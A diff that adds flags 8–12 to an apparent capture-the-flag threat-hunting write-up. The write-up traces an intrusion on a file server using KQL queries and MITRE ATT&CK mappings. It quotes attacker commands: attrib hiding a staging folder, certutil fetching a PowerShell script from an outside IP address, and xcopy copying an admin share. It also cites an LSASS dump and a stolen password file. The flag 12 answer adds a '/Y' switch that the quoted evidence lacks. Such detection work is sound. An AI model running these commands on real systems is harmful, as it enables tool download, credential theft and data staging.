@@ -882,12 +882,353 @@ The command structure is extremely common in Windows-based targeted intrusions.
 
 Hidden directories signal:
 
-A shift toward longer-term operations
-
-Intent to remain stealthy during staging
-
-Increased difficulty for post-incident evidence recovery
+* A shift toward longer-term operations
+* Intent to remain stealthy during staging
+* Increased difficulty for post-incident evidence recovery
 
 It is a strong behavioral IOC for defense evasion.
 
 ### MITRE ATT&CK Mapping
+
+| Technique                    | ID            |
+| ---------------------------- | ------------- |
+| Hidden Files and Directories | **T1564.001** |
+
+### Final Flag Answer
+
+` "attrib.exe" +h +s C:\Windows\Logs\CBS `
+
+---
+
+## FLAG 9 — COLLECTION: Staging Directory Path
+
+### Objective
+
+Identify the primary staging directory where the attacker consolidated collected data, tools, and credential dumps prior to exfiltration.
+
+### Investigation Approach
+
+After confirming that the attacker hid a directory using the attrib +h +s command (Flag 8), we pivoted to the same directory path as the likely staging location.
+
+We validated this by reviewing:
+
+- File creations within that location
+- Tool downloads and data aggregation in telemetry
+- Paths referenced in subsequent compression and exfiltration commands
+
+### Evidence Observed
+
+Multiple attacker actions referenced the same location:
+
+- Hidden using attrib +h +s
+- Downloaded tools saved here (ex.ps1)
+- Credentials and file collections stored here (IT-Admin-Passwords.csv)
+- Archive output created here (credentials.tar.gz)
+- LSASS dump saved here (lsass.dmp)
+
+All evidence consistently points to:
+
+` C:\Windows\Logs\CBS `
+
+
+This directory blends in with legitimate Windows logging infrastructure — making it an ideal covert stash point.
+
+###  Analysis & Interpretation
+
+The attacker intentionally selected this system log folder because:
+
+- It appears trusted and system-owned
+- Analysts often ignore it in quick searches
+- Combined hidden/system flag makes it unlikely to be browsed
+
+This directory became the center of the operation, containing:
+
+- Malware tools
+- Collected files
+- Credential dumps
+- Compressed archive prior to exfil
+
+### Why This Matters
+
+Identifying the staging directory:
+
+- Reveals every malicious file the attacker touched
+- Improves IOC scoping for quarantine and deletion
+- Shows where cleanup must occur
+- Highlights attack impact by enumerating stolen data
+
+This is one of the most important locations in the intrusion.
+
+### MITRE ATT&CK Mapping
+
+| Technique          | ID            |
+| ------------------ | ------------- |
+| Local Data Staging | **T1074.001** |
+
+### Final Flag Answer
+
+`C:\Windows\Logs\CBS`
+
+---
+
+## FLAG 10 — DEFENSE EVASION: Script Download Command
+
+### Objective
+
+Identify the exact command line the attacker used to download a PowerShell script (malicious tooling) into the hidden staging directory, using a living-off-the-land Windows utility.
+
+### Investigation Approach
+
+The scenario explicitly mentions:
+
+- A PowerShell script was fetched
+- A legitimate Windows binary was abused as a LOLBin
+- The script was stored under the staging directory: `C:\Windows\Logs\CBS\`
+
+We focused on:
+
+- `DeviceProcessEvents`
+- Commands containing `http` + the CBS path
+- Known download-capable tools like `certutil.exe`
+
+### Query Used
+
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-fileserver01"
+| where ProcessCommandLine contains "http"
+   or ProcessCommandLine contains "certutil"
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+### Evidence Observed
+
+A suspicious use of certutil.exe (a certificate utility that can also download files) was identified:
+
+<img width="550" height="118" alt="image" src="https://github.com/user-attachments/assets/ac5f151d-5a04-4478-8450-3435ac1ac2ff" />
+
+
+```
+Nov 22, 2025 12:58:24 AM
+Device: azuki-fileserver01
+Account: fileadmin
+Command:
+"certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
+```
+
+
+This command:
+
+Retrieves a remote PowerShell script (`ex.ps1`) via HTTP
+Writes it directly into the hidden staging directory
+Uses `-urlcache` and `-f` to force HTTP download and caching
+
+### Analysis & Interpretation
+
+Key takeaways:
+
+- certutil is a LOLBAS/LOLBin frequently used by attackers
+- The download of ex.ps1 indicates deployment of second-stage tooling
+- Using a built-in binary reduces detection from naive AV engines
+- The URL and destination path form strong IOCs
+
+This is a classic implementation of Ingress Tool Transfer.
+
+### Why This Matters
+
+This event shows:
+
+- The attacker is augmenting their toolkit on the compromised host
+- They are deliberately using legitimate system tools for evasion
+- Security controls must detect behavior, not just binaries
+
+It is a critical step bridging access and active operations (credentials, staging, exfil).
+
+### MITRE ATT&CK Mapping
+
+| Technique             | ID        |
+| --------------------- | --------- |
+| Ingress Tool Transfer | **T1105** |
+
+### Final Flag Answer
+
+` "certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1 `
+
+---
+
+## FLAG 11 — COLLECTION: Credential File Discovery
+
+### Objective
+
+Identify the credential file created by the attacker to store harvested privileged account credentials prior to exfiltration.
+
+### Investigation Approach
+
+Following the use of credential-dumping tooling and share access, the attacker needed to store extracted usernames/passwords in a structured form.
+
+We focused on:
+
+- `DeviceFileEvents`
+- FileCreated actions under the C:\Windows\Logs\CBS staging location
+
+A `.csv` extension was expected because attackers often export credentials in spreadsheet-compatible formats.
+
+### Query Used
+
+```
+DeviceFileEvents
+| where DeviceName contains "azuki-fileserver01"
+| where InitiatingProcessAccountName == @"fileadmin"
+| where FolderPath contains @"C:\Windows\Logs\CBS\"
+| where FileName contains ".c"
+| where ActionType == @"FileCreated"
+```
+
+### Evidence Observed
+
+A new file was created, clearly tied to administrative credential harvesting:
+
+```
+Nov 22, 2025 1:07:53 AM
+Device: azuki-fileserver01
+Account: fileadmin
+Action: FileCreated
+File: IT-Admin-Passwords.csv
+Location: C:\Windows\Logs\CBS\it-admin\IT-Admin-Passwords.csv
+```
+
+This filename is self-describing and strongly indicates the contents include high-value administrative credentials.
+
+### Analysis & Interpretation
+
+This confirms:
+
+- Credentials from the IT Administration share were collected and exported
+- The attacker likely gained password access to other servers and accounts
+- The staging directory is storing not only tools but stolen secrets
+
+The presence of this file also demonstrates data manipulation and aggregation, a hallmark of exfiltration operations.
+
+### Why This Matters
+
+Credential files like this:
+
+- Amplify the blast radius of compromise
+- Allow future privileged authentication abuse
+- Provide attackers with long-term persistence
+- Indicate active credential theft, not just discovery
+
+This file is a top-priority IOC for containment and investigation.
+
+### MITRE ATT&CK Mapping
+
+| Technique                        | ID        |
+| -------------------------------- | --------- |
+| Unsecured Credentials            | **T1552** |
+| Credentials from Password Stores | **T1555** |
+
+
+### Final Flag Answer
+
+` IT-Admin-Passwords.csv `
+
+---
+
+## FLAG 12 — COLLECTION: Recursive Copy Command
+
+### Objective
+
+Identify the full command line the attacker used to recursively copy data from a network file share into the hidden staging directory, using built-in Windows tooling.
+
+🔍 Investigation Approach
+
+After:
+
+* Enumerating shares (`net share, net view`)
+* Confirming privileges (`whoami /all`)
+* Hiding the staging folder (`attrib +h +s C:\Windows\Logs\CBS`)
+
+…the next logical step was bulk data collection from a sensitive share.
+
+We focused on:
+
+* `DeviceProcessEvents`
+* Native file copy utilities that support recursive operations:
+    - `xcopy.exe`
+    - `robocopy.exe`
+
+The hunt hints specifically call out batch-capable native tools and preserving subdirectories and attributes.
+
+### Query Used
+
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-fileserver01"
+| where InitiatingProcessAccountName == @"fileadmin"
+| where ProcessCommandLine contains "copy"
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
+```
+
+### Evidence Observed
+
+A high-volume copy operation from an internal file share into the hidden CBS staging directory was observed:
+
+<img width="868" height="114" alt="image" src="https://github.com/user-attachments/assets/acabcf8c-798f-498e-a213-f011f1337059" />
+
+
+```
+Timestamp: during the main collection window (shortly after credential and share discovery)
+Device: azuki-fileserver01
+Account: fileadmin
+Command:
+"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H
+```
+Breaking down the flags:
+
+- `/E` → copy all subdirectories, including empty ones
+- `/I` → assume the destination is a directory
+- `/H` → include hidden and system files
+
+This indicates a full replication of the IT-Admin share into the attacker’s staging area.
+
+### Analysis & Interpretation
+
+This step shows:
+
+- Systematic data harvesting from an administrative file share
+- Use of a native Windows utility (xcopy) to reduce detection likelihood
+- Preservation of directory structure and file attributes, making later navigation and filtering easier for the attacker
+
+It also directly supports later artifacts like:
+
+- `IT-Admin-Passwords.csv`
+- `credentials.tar.gz`
+
+which reside under `C:\Windows\Logs\CBS\it-admin.`
+
+### Why This Matters
+
+This command is a critical behavioral IOC:
+
+- Shows unapproved replication of sensitive administrative data
+- Demonstrates attacker knowledge of high-value locations
+- Provides defenders with a clear pattern to build detections for staged collection
+
+It marks the transition from access to actual data theft in progress.
+
+### MITRE ATT&CK Mapping
+
+| Phase      | Technique            | ID            |
+| ---------- | -------------------- | ------------- |
+| Collection | Automated Collection | **T1119**     |
+| Collection | Local Data Staging   | **T1074.001** |
+
+
+
+### Final Flag Answer
+
+`"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
+
+---
+
